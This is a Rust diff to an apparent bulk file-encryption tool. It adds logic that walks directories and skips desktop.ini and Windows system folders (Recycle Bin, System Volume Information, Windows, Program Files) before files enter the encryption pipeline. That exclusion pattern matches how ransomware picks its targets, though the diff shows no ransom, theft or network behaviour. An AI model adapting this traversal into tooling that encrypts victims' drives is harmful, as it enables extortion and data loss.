@@ -50,6 +50,16 @@ fn discover_files_recursive<'a>(
 ) -> Pin<Box<dyn Future<Output = Result<()>> + 'a>> {
     Box::pin(async move {
         if current.is_file() {
+            // Skip Windows/'s desktop.ini
+            if let Some(filename) = current.file_name() {
+                let filename_str = filename.to_string_lossy().to_lowercase();
+                if filename_str == "desktop.ini"
+                {
+                    debug_log!("skipping system file: {:?}", current);
+                    return Ok(());
+                }
+            }
+
             let is_enc = current.extension().map_or(false, |e| e == "enc");
 
             let should_consider = match mode {
@@ -84,6 +94,20 @@ fn discover_files_recursive<'a>(
                 *file_id += 1;
             }
         } else if current.is_dir() {
+            // Skip system directories
+            if let Some(dirname) = current.file_name() {
+                let dirname_str = dirname.to_string_lossy().to_lowercase();
+                if dirname_str == "$recycle.bin"
+                    || dirname_str == "system volume information"
+                    || dirname_str == "windows"
+                    || dirname_str == "program files"
+                    || dirname_str == "program files (x86)"
+                {
+                    debug_log!("skipping system directory: {:?}", current);
+                    return Ok(());
+                }
+            }
+
             let mut entries = tokio::fs::read_dir(current).await?;
             while let Some(entry) = entries.next_entry().await? {
                 discover_files_recursive(root, &entry.path(), mode, tasks, file_id).await?;
@@ -98,10 +122,7 @@ fn discover_files_recursive<'a>(
 // code for file reading workers.
 
 // reads a file and sends chunks to encryption pipeline
-pub async fn worker_read(
-    task: FileTask,
-    tx: mpsc::Sender<ReadMessage>,
-) -> Result<()> {
+pub async fn worker_read(task: FileTask, tx: mpsc::Sender<ReadMessage>) -> Result<()> {
     debug_log!("reader: opening {:?}", task.original_path);
 
     let mut file = File::open(&task.original_path).await?;
@@ -515,9 +536,7 @@ pub fn spawn_workers_write(
     metadata: Arc<Mutex<FileMetadata>>,
     contexts: Arc<Mutex<HashMap<u64, FileEncryptionContext>>>,
 ) -> tokio::task::JoinHandle<Result<()>> {
-    tokio::spawn(async move {
-        worker_write(rx, metadata, contexts).await
-    })
+    tokio::spawn(async move { worker_write(rx, metadata, contexts).await })
 }
 
 // ================== ENCRYPTION ENTRYPOINT ==================
